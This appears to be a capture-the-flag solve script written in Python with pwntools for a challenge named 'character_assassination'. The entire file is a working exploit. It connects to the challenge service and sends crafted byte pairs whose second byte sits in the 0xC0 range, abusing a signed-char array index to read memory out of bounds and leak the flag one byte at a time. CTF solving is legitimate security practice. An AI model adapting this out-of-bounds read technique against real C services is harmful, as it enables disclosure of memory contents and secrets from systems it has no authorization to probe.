#!/usr/bin/env python3
# Leak the flag from character_assassination.c by exploiting the signed-char index bug.
DESCRIPTION = "Leak the flag from character_assassination.c via the signed char index bug."

from __future__ import annotations

import argparse
from pwn import remote

DEFAULT_HOST = "character-assassination.challs.pwnoh.io"
DEFAULT_PORT = 1337

#+ comment
# Drive the service to leak bytes by sending crafted signed-character indices.
def leak_flag(io) -> bytes:
    io.recvuntil(b"> ")
    leaked = bytearray()
    for index in range(64):
        payload = bytes([ord("A"), 0xC0 + index])
        io.sendline(payload)
        line = io.recvline().rstrip(b"\r\n")
        io.recvuntil(b"> ")
        if len(line) < 2:
            continue
        leaked.append(line[1])
        if line[1] == ord("}"):
            break
    return bytes(leaked)


#+ comment for main
# Connect to the remote service to fetch and display the leaked flag.
def main() -> int:
    parser = argparse.ArgumentParser(DESCRIPTION)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    args = parser.parse_args()

    io = remote(args.host, args.port, ssl=True)
    flag = leak_flag(io)
    io.close()
    print(flag.decode(errors="ignore"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
